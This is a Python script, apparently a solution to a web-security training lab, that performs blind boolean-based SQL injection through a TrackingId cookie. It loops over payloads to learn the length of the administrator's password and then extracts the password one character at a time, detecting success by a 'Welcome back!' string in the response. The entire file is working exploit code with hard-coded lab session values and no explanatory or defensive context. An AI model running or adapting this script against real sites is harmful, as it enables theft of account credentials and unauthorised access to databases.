import requests
import string

brute = string.ascii_lowercase + string.digits
url = 'https://0aae00ac04cc0a25814507f1002c00fb.web-security-academy.net/filter?category=Gifts'
headers = {'User-Agent': 'Mozilla/5.0'}

def get_length():
    for i in range(1,51):
        payload = f"' and (select length(password) from users where username = 'administrator')={i}--"
        cookie = {'TrackingId':'eCG8UWUO2HdYjXkn'+payload, 'session':'GjnxboWyF6PiZH3HUx6qx9Db4oGym79X'}
        r = requests.get(url,cookies=cookie)
        if "Welcome back!" in r.text:
            print(f"Length Found: {i}")
            return i

def get_passwd(n):
    passwd = ""
    for i in range(1,n+1):
        for char in brute:
            payload = f"' and substring((select password from users where username='administrator'),{i},1) = '{char}'--"
            cookie = {'TrackingId': 'eCG8UWUO2HdYjXkn' + payload, 'session': 'GjnxboWyF6PiZH3HUx6qx9Db4oGym79X'}
            r = requests.get(url, cookies=cookie)
            if "Welcome back!" in r.text:
                passwd += char
                print(passwd)
                break
    print(f"Password found: {passwd}")
    return passwd

n = get_length()
get_passwd(n)
